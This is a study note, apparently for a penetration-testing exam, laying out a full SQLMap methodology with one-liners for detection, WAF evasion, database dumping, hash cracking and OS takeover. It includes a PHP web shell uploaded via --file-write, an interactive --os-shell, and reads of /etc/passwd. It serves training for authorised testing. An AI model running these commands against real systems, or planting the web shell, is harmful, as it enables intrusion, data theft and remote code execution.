# NOTE — SQLMap Pentest Methodology (Exam Playbook)

## ID
702

## Module
SQLMap Essentials

## Kind
methodology

## Title
SQLMap Essentials — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for SQLMap: request prep → detection → output reading → tuning → protection bypass → enumeration → OS takeover. Decision tree first, prose last.

## Tags
methodology, sqlmap, sqli, exam, cheatsheet, decision-tree, enumeration, tamper, os-shell, csrf

---

## TL;DR — The 6-Phase Flow

1. **Identify the request shape** — GET param, POST body, cookie, JSON, or header. Build the right invocation (`-u` / `--data` / `-H 'Cookie: id=*'` / `-r req.txt`).
2. **Run defaults first** — `--batch` with default level/risk. Read the output: stable URL → dynamic param → heuristic hit → confirmed injection.
3. **Tune only when defaults fail** — escalate `--level/--risk`, supply `--prefix/--suffix` if you know the boundary, or go surgical with `--technique=U --union-cols=N`.
4. **Bypass protections** — CSRF tokens (`--csrf-token`), unique-value params (`--randomize`), UA blocks (`--random-agent`), WAF/character filters (`--tamper`).
5. **Enumerate** — banner → current user → current db → DBA, then `--tables`, `--dump -T -D`, `--search`, `--passwords`, optional `--schema`.
6. **Escalate to OS** — if `--is-dba` is true: `--file-read` → `--file-write` web shell → `--os-shell --technique=E` for an interactive shell.

> **Golden rule:** Always run defaults first. Cranking `--level 5 --risk 3` as habit is slow (~7,865 payloads vs ~72) and the OR-based payloads at risk 3 can mutate data on real targets.

---

## Phase 1 — Request Preparation

SQLMap is only as good as the request you feed it. Misshapen requests are the #1 reason a real injection is missed.

### Pick the right invocation
| Vector | Invocation |
|---|---|
| GET param | `sqlmap -u 'http://<T>:<P>/page.php?id=1' --batch` |
| POST form body | `sqlmap -u 'http://<T>:<P>/page.php' --data 'id=1' --batch` |
| Cookie | `sqlmap -u 'http://<T>:<P>/page.php' -H 'Cookie: id=*' --batch` |
| JSON body (short) | `sqlmap -u 'http://<T>:<P>/page.php' --data '{"id":1}' --batch` |
| JSON body (complex) / many headers / auth | `sqlmap -r req.txt --batch` |
| Quick ad-hoc | paste cURL → swap `curl` for `sqlmap` |

### The `*` marker
Mark the *exact* injection point when SQLMap can't infer it (cookie value, multi-param data string, custom header):
- `-H 'Cookie: id=*'`
- `--data 'uid=1*&name=test'`
- `?id=1&col=*`

### Capturing a request file from DevTools
1. `Ctrl+Shift+E` → Network → submit/refresh.
2. Click the request → **Headers** panel → **Raw** → copy.
3. **Request** panel → **Raw** → copy body.
4. Paste into `req.txt`: headers, **blank line**, body. Blank line is mandatory.
5. `sqlmap -r req.txt --batch --dump`.

### Stealth defaults
- `--random-agent` — SQLMap's default UA (`sqlmap/1.x.x`) is fingerprinted by every WAF. Make this habitual.
- `--proxy=http://127.0.0.1:8080` — route through Burp/ZAP for visibility.

---

## Phase 2 — Run Defaults & Read the Output

Always start with default `--level 1 --risk 1` (~72 payloads/param). Read the stream like a checklist.

### Output milestones (in order)
| Message | Meaning |
|---|---|
| `target URL content is stable` | Baseline OK — detection signals will be reliable |
| `parameter appears to be dynamic` | Param affects response — prerequisite for SQLi |
| `heuristic (basic) test shows … might be injectable (possible DBMS: 'X')` | Indicator only, not proof. DBMS guess shown |
| `it looks like the back-end DBMS is 'X'. Skip tests for other DBMSes? [Y/n]` | Accept Y to speed up |
| `extending provided level (1) and risk (1) values?` | Y to broaden tests for the identified DBMS |
| `reflective value(s) found and filtering out` | SQLMap is auto-cleaning response noise — fine |
| `parameter appears to be 'X' injectable (with --string="luther")` | Confirmed injection of type X. `--string` = stable TRUE marker (high confidence) |
| `time-based comparison requires larger statistical model … (done)` | Building latency baseline — slow but necessary |
| `sqlmap identified the following injection point(s) with a total of N HTTP(s) requests:` | Final proof — exploitable payloads listed |
| `fetched data logged to text files under '~/.sqlmap/output/<host>'` | Session cached — subsequent runs skip detection |

### Quick checks
- **No `is vulnerable` line?** Defaults didn't find it. Move to Phase 3.
- **Subsequent run jumps straight to enumeration?** Normal — using cached session.
- **DBMS guess wrong?** Force with `--dbms=mysql`.

---

## Phase 3 — Attack Tuning (When Defaults Fail)

Three failure modes, three tools.

### 3.1 Unknown SQL context → `--level 5 --risk 3`
You're confident the param is injectable but you don't know how it's embedded in the query.
```bash
sqlmap -u 'http://<T>:<P>/case5.php?id=*' --level 5 --risk 3 -T <table> --batch --dump
```
- Jumps to ~7,865 payloads — **slow**. Last resort, never the first move.
- Risk 3 includes OR-based payloads → can `UPDATE`/`DELETE` rows. Never on prod without consent.

### 3.2 Known boundary → `--prefix` / `--suffix`
You have hints (error messages, source code, parameter role). Pick the lock instead of trying every key:
```bash
# Column name in ORDER BY → likely backtick + paren wrapped: `col`)
sqlmap -u 'http://<T>:<P>/case6.php?col=id' --prefix='`)' -T <table> --batch --dump
```
Boundary clues:
- `id=` numeric → no quoting (`--prefix=''`).
- `name='X'` → single quote (`--prefix="'"`).
- `ORDER BY \`col\`)` → backtick + paren (`--prefix='\`)'`).

### 3.3 UNION viable + known column count → surgical
Page renders results in a visible table → UNION works. Confirm column count manually (`ORDER BY N`), then:
```bash
sqlmap -u 'http://<T>:<P>/case7.php?id=1' --technique=U --union-cols=5 -T <table> --batch --dump
```
If default UNION fill (`NULL`) breaks data types, try `--union-char='a'`.

### 3.4 Other useful tuning
- `--technique=BEUSTQ` — narrow tested types. Skip slow ones: `--technique=BEU` (no time-based, no stacked).
- `-v 3` — print every `[PAYLOAD]` for debugging.
- `--code=200` / `--string='success'` / `--titles` / `--text-only` — when TRUE/FALSE responses are hard to distinguish.
- `--parse-errors` — surface DBMS errors live (great with `-v 3`).
- `-t /tmp/traffic.txt` — dump all HTTP traffic to a file for offline review.

### Decision shortcut
| Situation | Reach for | Speed |
|---|---|---|
| Default fails, no SQL context info | `--level 5 --risk 3` | Slow |
| You can guess the SQL boundary | `--prefix` / `--suffix` | Fast |
| Tabular output visible + column count known | `--technique=U --union-cols=N` | Fastest |
| Login page (needs OR payloads) | minimum `--risk 3` | Medium |
| Want to see what SQLMap is trying | `-v 3` | Same speed |

---

## Phase 4 — Bypassing Protections

Identify the protection in DevTools first, *then* pick the flag.

### 4.1 Anti-CSRF token
Form has a hidden token field. Grab the current value from DevTools, then let SQLMap auto-refresh:
```bash
sqlmap -u '...' --data 'id=1&t0ken=<VALUE>' --csrf-token=t0ken --batch --dump
```
If the field name contains `csrf`, `xsrf`, or `token`, SQLMap auto-prompts.

### 4.2 Unique-per-request value
Some apps require a parameter to be unique each request (anti-replay):
```bash
sqlmap -u '...?id=1&uid=12345' --randomize=uid --batch --dump
```

### 4.3 Calculated parameter
Param is a hash/transform of another (`h = MD5(id)`):
```bash
sqlmap -u '...?id=1&h=<HASH>' \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch --dump
```

### 4.4 User-Agent blacklist
5xx errors immediately, before any payload? UA is blocked:
```bash
sqlmap -u '...' --data='id=1' --random-agent --batch --dump
```

### 4.5 WAF / character filter → tamper scripts
Chain Python-based payload mutators. Run in priority order to avoid conflicts:
```bash
sqlmap -u '...?id=1' --tamper=between,randomcase --batch --dump
sqlmap --list-tampers   # show all available
```
Common tampers:
| Tamper | Effect |
|---|---|
| `between` | Replaces `=` with `BETWEEN x AND x`, `>` with `BETWEEN`. Bypasses char filters |
| `randomcase` | `SELECT` → `SeLeCt` — bypass case-sensitive keyword blacklists |
| `space2comment` | Spaces → `/**/` — bypass space filters |
| `space2hash` | Spaces → `%23\n` (MySQL only) |
| `modsecurityversioned` | MySQL-only ModSecurity bypass |

### 4.6 IP rotation
- Single proxy: `--proxy=http://<IP>:<PORT>` (or `socks4://`)
- Rotation list: `--proxy-file=proxies.txt`
- Tor: `--tor --check-tor` (Tor must already be running locally on 9050/9150).

---

## Phase 5 — Enumeration

After confirmed injection (or cached session), climb the enumeration ladder.

### 5.1 Recon block (always run first)
```bash
sqlmap -u '...?id=1' --banner --current-user --current-db --is-dba --batch
```
Output tells you: DBMS version, app DB user, current database, **whether OS exploitation is on the table** (DBA = yes).

### 5.2 Schema → tables → dump
```bash
# Bird's-eye view of every DB/table/column
sqlmap -u '...' --schema --batch

# Tables in a specific DB
sqlmap -u '...' --tables -D <db> --batch

# Dump a single table (fastest, focused)
sqlmap -u '...' --dump -T <table> -D <db> --batch

# Slim it down further
sqlmap -u '...' --dump -T users -D <db> -C name,surname --batch
sqlmap -u '...' --dump -T users -D <db> --start=2 --stop=3 --batch
sqlmap -u '...' --dump -T users -D <db> --where="name LIKE 'f%'" --batch

# Nuclear: everything except system DBs
sqlmap -u '...' --dump-all --exclude-sysdbs --batch
```

### 5.3 Keyword search (when you don't know the table/column name)
`--search` uses SQL `LIKE` against **identifier names**, not row contents:
```bash
sqlmap -u '...' --search -T user --batch     # tables matching 'user'
sqlmap -u '...' --search -C pass --batch     # columns matching 'pass' across all DBs
```

### 5.4 Auto-crack hashes
When `--dump` hits a column that looks like a hash, SQLMap recognizes 31 hash types and offers dictionary cracking against a 1.4M-entry built-in wordlist. With `--batch` it accepts defaults and attempts the crack:
- Cracked passwords appear in parentheses: `d642ff0f...deba0 (Enizoom1609)`.

### 5.5 DBMS system credentials vs app user table
Different things:
- `--passwords` → pulls from system tables like `mysql.user` (DB server accounts).
- `--dump -T users -D appdb` → application users.

---

## Phase 6 — OS Exploitation (DBA Required)

Only attempt if `--is-dba` returned `True`.

### 6.1 File read
```bash
sqlmap -u '...?id=1' --file-read "/var/www/html/flag.txt" --batch
# Output saved locally, NOT printed to stdout. Path shown in SQLMap log:
# ~/.sqlmap/output/<host>/files/_var_www_html_flag.txt
cat ~/.sqlmap/output/<host>/files/_var_www_html_flag.txt
```
Slashes become underscores in the local filename.

### 6.2 File write (web shell)
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u '...?id=1' --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" --batch
curl 'http://<T>:<P>/shell.php?cmd=whoami'
```

### 6.3 Interactive OS shell
```bash
sqlmap -u '...?id=1' --os-shell --technique=E --batch
# os-shell> id
# os-shell> cat /flag.txt
# os-shell> find / -name "flag*" 2>/dev/null
```
**Use `--technique=E`.** Default may pick UNION which often returns `No output`.

### 6.4 Post-RCE checklist
- `id` → confirm context (usually `www-data`, **not** OS root).
- `find / -name "flag*" 2>/dev/null` → loot.
- `cat /etc/passwd` → user list for credential reuse.
- `--os-shell` drops two PHP files (stager + backdoor) in webroot — note for cleanup.

---

## Decision Tree (Under Exam Pressure)

```
Got a request with a parameter
│
├── Pick invocation
│   ├── GET           → -u 'http://T/page?id=1'
│   ├── POST form     → -u 'http://T/page' --data 'id=1'
│   ├── Cookie        → -H 'Cookie: id=*'
│   ├── JSON          → --data '{"id":1}'  OR  -r req.txt
│   └── Complex/auth  → -r req.txt  (DevTools → Network → raw → blank line → body)
│
├── Run defaults: sqlmap … --batch [--dump]
│   │
│   ├── "is vulnerable" line appears  →  go to ENUMERATE
│   │
│   └── Not detected
│       │
│       ├── Know SQL context?  yes → --prefix='…' [--suffix='…']
│       ├── Tabular page output?  yes → --technique=U --union-cols=<N>  (confirm count via ORDER BY)
│       └── Otherwise           → --level 5 --risk 3   (last resort, slow)
│
├── Hits a protection?
│   ├── Hidden form token        → --csrf-token=<NAME>  (+ --data with current value)
│   ├── Param needs unique value → --randomize=<NAME>
│   ├── Param is hash of another → --eval="…python…"
│   ├── Immediate 5xx / blocked  → --random-agent
│   └── 403/406, char filter     → --tamper=between,randomcase  (use --list-tampers)
│
├── ENUMERATE
│   ├── --banner --current-user --current-db --is-dba   (always first)
│   ├── --tables -D <db>          → --dump -T <tbl> -D <db>
│   ├── Don't know name?          → --search -T <kw>  /  --search -C <kw>
│   ├── Hashes in dump?           → SQLMap auto-cracks (with --batch)
│   └── DB server accounts        → --passwords
│
└── --is-dba: True ?
    ├── No  → stop at data exfil
    └── Yes →
        ├── --file-read "/path"           (saved locally — cat the file)
        ├── --file-write "shell.php" --file-dest "/var/www/html/shell.php"
        └── --os-shell --technique=E      (E for reliable output, not U)
```

---

## Filter / Signal → Counter-Move Reference

| Signal observed | Likely cause | Counter-move |
|---|---|---|
| `all tested parameters do not appear to be injectable` | Default boundaries don't match | `--level 5 --risk 3` OR supply `--prefix`/`--suffix` |
| `target URL content is not stable` | Response varies between identical requests | `--text-only` / `--titles` / `--code=200` / `--string='X'` |
| `time-based comparison requires larger statistical model` | High latency, baseline still building | Be patient — required for accurate timing |
| Heuristic DBMS guess looks wrong | Bad fingerprint | Force with `--dbms=mysql` (or correct DB) |
| 5xx errors on every request from start | UA blacklisted | `--random-agent` |
| 403/406 on payloads but not on baseline | WAF blocking specific chars/keywords | `--tamper=between,randomcase` (chain as needed) |
| Form rejects requests without a token field | Anti-CSRF | `--csrf-token=<name>` + grab current value from DevTools |
| Param value must change each request | Anti-replay | `--randomize=<name>` |
| Param `h` derived from another param | Hash/HMAC validation | `--eval="…python…"` |
| `cookie: id=…` not tested | No `*` marker | `-H 'Cookie: id=*'` |
| `-r req.txt` "no parameters found" | Missing blank line between headers and body | Add the blank line |
| `Copy as cURL` paste fails | curl-only flags like `--compressed` | Strip them before passing to sqlmap |
| `--os-shell` returns `No output` | UNION technique chosen | Force `--technique=E` |
| `--file-read` "didn't print anything" | Output saved to local file | `cat ~/.sqlmap/output/<host>/files/_<path>` |
| `--is-dba: False` | App user lacks privileges | File ops will fail — skip Phase 6 |
| MySQL `--file-write` blocked | `secure-file-priv` set | No bypass — drop attempt |
| Re-run jumps straight to dump | Cached session | Normal. Delete `~/.sqlmap/output/<host>/` for clean run |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: GET parameter, defaults ===
sqlmap -u 'http://<T>:<P>/page.php?id=1' --batch --dump

# === Scenario 2: POST form ===
sqlmap -u 'http://<T>:<P>/page.php' --data 'id=1' --batch --dump

# === Scenario 3: Cookie injection ===
sqlmap -u 'http://<T>:<P>/page.php' -H 'Cookie: id=*' --batch --dump

# === Scenario 4: JSON / authenticated request ===
# Capture from DevTools → save as req.txt with blank line between headers & body
sqlmap -r req.txt --batch --dump

# === Scenario 5: Default fails, no SQL context info ===
sqlmap -u 'http://<T>:<P>/case5.php?id=*' --level 5 --risk 3 -T <table> --batch --dump

# === Scenario 6: Known SQL boundary (e.g. backtick + paren) ===
sqlmap -u 'http://<T>:<P>/case6.php?col=id' --prefix='`)' -T <table> --batch --dump

# === Scenario 7: Surgical UNION (column count known) ===
sqlmap -u 'http://<T>:<P>/case7.php?id=1' --technique=U --union-cols=5 -T <table> --batch --dump

# === Scenario 8: Anti-CSRF token ===
sqlmap -u 'http://<T>:<P>/page.php' \
  --data 'id=1&t0ken=<CURRENT_VALUE>' --csrf-token=t0ken --batch --dump

# === Scenario 9: Unique-per-request value ===
sqlmap -u 'http://<T>:<P>/page.php?id=1&uid=12345' --randomize=uid --batch --dump

# === Scenario 10: Calculated hash parameter ===
sqlmap -u 'http://<T>:<P>/page.php?id=1&h=<HASH>' \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch --dump

# === Scenario 11: UA blacklist ===
sqlmap -u 'http://<T>:<P>/page.php' --data='id=1' --random-agent --batch --dump

# === Scenario 12: WAF / character filter ===
sqlmap -u 'http://<T>:<P>/page.php?id=1' --tamper=between,randomcase --batch --dump

# === Scenario 13: Recon block (run before any dump) ===
sqlmap -u 'http://<T>:<P>/page.php?id=1' \
  --banner --current-user --current-db --is-dba --batch

# === Scenario 14: Don't know the table/column name ===
sqlmap -u '...' --search -T user --batch
sqlmap -u '...' --search -C pass --batch

# === Scenario 15: DBA → file read ===
sqlmap -u '...?id=1' --file-read "/var/www/html/flag.txt" --batch
cat ~/.sqlmap/output/<host>/files/_var_www_html_flag.txt

# === Scenario 16: DBA → web shell upload ===
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u '...?id=1' --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" --batch
curl 'http://<T>:<P>/shell.php?cmd=whoami'

# === Scenario 17: DBA → interactive OS shell ===
sqlmap -u '...?id=1' --os-shell --technique=E --batch

# === Scenario 18: Debugging a stuck run ===
sqlmap -u '...' -v 3 --parse-errors --batch
sqlmap -u '...' -t /tmp/traffic.txt --batch
sqlmap -u '...' --proxy="http://127.0.0.1:8080"
```

---

## Top Gotchas (Things That Will Burn You)

1. **`--level 5 --risk 3` as a default habit** — ~7,865 payloads vs ~72, dramatically slower. Risk 3 includes OR-based payloads that can `UPDATE`/`DELETE` data on real targets. Always start with defaults; escalate only when defaults fail.
2. **Forgetting the `*` marker on cookie injection** — without `-H 'Cookie: id=*'` SQLMap treats the cookie as a static value and never tests it. Zero results, wasted time.
3. **Missing blank line in `-r` request file** — the blank line between headers and body is mandatory. Without it, SQLMap parses the body as another header and nothing works.
4. **`--data '{"id":1}'` with wrong Content-Type** — SQLMap may send it as form-data instead of JSON. When in doubt, use `-r` with the captured request.
5. **`Copy as cURL` quirks** — Firefox/Chrome add `--compressed` and other curl-specific flags SQLMap doesn't understand. Strip them before pasting.
6. **`--file-read` doesn't print to stdout** — output is saved to `~/.sqlmap/output/<host>/files/_<path>`. If you don't `cat` it, you won't see anything.
7. **`--os-shell` returns `No output`** — don't assume failure. Default technique is often UNION; force `--technique=E` (error-based) for reliable output.
8. **MySQL `--secure-file-priv`** — blocks `--file-write` on modern installs. No bypass; drop the attempt.
9. **`root` DB user ≠ OS root** — even with DBA, the OS shell runs as `www-data` (or whatever the web server uses). Plan privesc accordingly.
10. **DBMS guess can be wrong** — heuristic DBMS detection isn't proof. Force with `--dbms=mysql` if you're certain.
11. **Cached session means subsequent runs skip detection** — this is normal, not a bug. Clean `~/.sqlmap/output/<host>/` if you want a fresh run.
12. **`--randomize` vs `--csrf-token`** — `--randomize` only works when *any* random value is accepted. If the server validates the value against a session/page, you need `--csrf-token`.
13. **Tamper scripts are DBMS-specific** — `space2hash` and `modsecurityversioned` are MySQL-only. Wrong tamper for the target DB silently breaks payloads.
14. **`--tor` doesn't start Tor** — it expects Tor already running locally on 9050/9150. Install and start it first, verify with `--check-tor`.
15. **`--search -C pass` matches across system DBs** — expect noise from `mysql.user`, `information_schema`. Filter to application DBs.
16. **`--passwords` ≠ `--dump` of users table** — `--passwords` reads DBMS server accounts (`mysql.user`); `--dump -T users` reads application users. Different data.
17. **`--union-cols` wrong count = silent failure** — UNION just doesn't work. Confirm via `ORDER BY N` in the browser before passing the flag.
18. **`--prefix` syntax must match exactly** — must close the surrounding SQL precisely. Use error messages or `-v 3` to see what's tried.
19. **Default UA gets blocked everywhere** — `--random-agent` should be habitual on real targets. SQLMap's default UA is trivially fingerprinted.
20. **`--batch` skips important prompts** — great for labs. On real engagements review prompts manually so you don't auto-accept a destructive technique.
21. **`reflective value(s) found and filtering out` is normal** — SQLMap is auto-cleaning response noise. Trust it; verify with `--no-cast` only in edge cases.
22. **`time-based comparison requires larger statistical model`** — slow but mandatory for accurate timing detection on high-latency networks. Be patient.

---

## Reference

| Use case | Resource |
|---|---|
| Basic / advanced help | `sqlmap -h` / `sqlmap -hh` |
| All tamper scripts | `sqlmap --list-tampers` |
| Local session/output dir | `~/.sqlmap/output/<host>/` |
| Manual install | `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git` |
| Apt install | `sudo apt install sqlmap` |
| Built-in cracking dictionary | 1.4M entries, 31 hash formats supported |

---

## Related Vault Notes

- `01-overview.md` — SQLMap capabilities, BEUSTQ technique mnemonic, DBMS support
- `02-getting-started.md` — `-h` / `-hh` help, first-run example, `--batch`
- `03-output-description.md` — interpreting log messages stage by stage
- `04-http-request.md` — GET / POST / cookie / JSON / `-r` request files, `*` marker, `--random-agent`
- `05-handling-errors.md` — `--parse-errors`, `-t`, `-v 6`, `--proxy` debugging
- `06-attack-tuning.md` — `--level/--risk`, `--prefix/--suffix`, surgical UNION, response comparison
- `07-database-enumeration.md` — banner → user → db → DBA, `--tables`, `--dump`, `-C`, `--start/--stop`, `--where`
- `08-advanced-enumeration.md` — `--schema`, `--search`, auto hash cracking, `--passwords`, `--all`
- `09-bypassing-protections.md` — `--csrf-token`, `--randomize`, `--eval`, `--random-agent`, `--tamper`, proxy/Tor
- `10-os-exploitation.md` — `--is-dba`, `--file-read`, `--file-write`, `--os-shell --technique=E`
- `sqlmap-decision-flowchart.svg` — visual companion to the decision tree above
